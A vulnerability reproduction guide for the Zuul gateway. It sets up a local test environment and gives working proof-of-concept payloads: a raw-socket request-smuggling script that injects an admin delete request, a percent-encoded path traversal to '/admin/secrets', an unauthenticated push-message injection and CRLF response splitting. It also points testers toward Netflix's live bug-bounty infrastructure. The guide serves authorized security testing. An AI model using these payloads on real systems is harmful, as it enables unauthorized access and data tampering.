# Real-World Vulnerability Reproduction Guide

This guide provides instructions on how to set up a local, representative environment to demonstrate the high-impact vulnerabilities identified in the Zuul security audit.

**WARNING: These PoCs are for educational and authorized testing purposes only. Never test against systems you do not own.**

## 1. Environment Setup

The easiest way to test Zuul is using the included `zuul-sample` project.

### Step 1: Build Zuul
```bash
./gradlew :zuul-sample:installDist
```

### Step 2: Start the Sample Server
```bash
# In one terminal
./gradlew :zuul-sample:run
```
Zuul will start and listen on port `7001` (Main Gateway) and `7008` (Push Messaging).

### Step 3: Start a Mock Backend (The "Internal Service")
We need a backend that Zuul will route to. You can use a simple Python script to log incoming requests and headers.

```python
# mock_backend.py
from http.server import HTTPServer, BaseHTTPRequestHandler

class MockHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n=== RECEIVED REQUEST ===")
        print(f"{self.command} {self.path} {self.request_version}")
        for k, v in self.headers.items():
            print(f"{k}: {v}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Backend Response")

print("Mock Backend starting on port 8080...")
HTTPServer(('0.0.0.0', 8080), MockHandler).serve_forever()
```

### Step 4: Configure Zuul to Route to the Mock Backend
Modify `zuul-sample/src/main/resources/application.properties` to point to your mock backend (or use Archaius properties).
```properties
api.ribbon.listOfServers=localhost:8080
api.ribbon.NIWSServerListClassName=com.netflix.loadbalancer.ConfigurationBasedServerList
```

---

## 2. Vulnerability PoCs

### PoC 1: Request Smuggling (Outbound Header Injection)
Target: `http://localhost:7001`

Use this Python script to send a raw request with an injected CRLF.
```python
import socket

target_host = "localhost"
target_port = 7001

# The payload: CRLF in a header that Zuul proxies
# We inject a second request to /admin/delete-user
payload = (
    "GET /api/v1/resource HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "X-Forwarded-For: 127.0.0.1\r\n\r\n"
    "GET /admin/delete-user?id=1 HTTP/1.1\r\n"
    "Host: internal-service\r\n"
    "Connection: close\r\n\r\n"
    "\r\n"
).encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_host, target_port))
s.sendall(payload)
print(s.recv(4096).decode())
s.close()
```
**Verification:** Check the `mock_backend.py` output. You will see two separate requests received, even though only one was sent to the gateway.

### PoC 2: ACL Bypass (Path Normalization Discrepancy)
Send a request using percent-encoded dots to bypass a hypothetical `/admin` filter.

```bash
curl -v "http://localhost:7001/public/%2e%2e/admin/secrets"
```
**Verification:** Zuul's logs will show it matched against the `/public/...` path, but the `mock_backend.py` will receive a request for `/admin/secrets`.

### PoC 3: Push Messaging Auth Bypass
Target: `http://localhost:7008/push`

```bash
# Send a message to any customer ID without the required secure token
curl -X POST http://localhost:7008/push \
     -H "X-CUSTOMER_ID: 1337" \
     -d '{"msg": "Malicious Injection"}'
```
**Verification:** If a client is connected to Zuul with `customerid: 1337`, they will receive this message despite the missing security token.

### PoC 4: Response Splitting (via X-Originating-URL)
Target: `http://localhost:7001`

```bash
# Request a path with encoded CRLF
curl -v "http://localhost:7001/path%0d%0aInjected-Header:value"
```
**Verification:** Examine the response headers. You will see `X-Originating-URL` followed by the `Injected-Header` on a new line.

---

## 3. Real-World Targets (Netflix Bug Bounty)
When testing against the real Netflix infrastructure (as allowed by their [HackerOne Policy](https://hackerone.com/netflix)), focus on the same patterns:
1.  Identify headers that are reflected in responses or propagated to backends.
2.  Test for CRLF injection in those headers.
3.  Test path normalization by using `%2e%2e/` sequences in various parts of the URL.
4.  If you find an internal push service, check if token verification is mandatory.

**Always abide by the "Golden Rule" of Bug Bounties: Do no harm. Use your own test accounts and avoid impacting other users.**
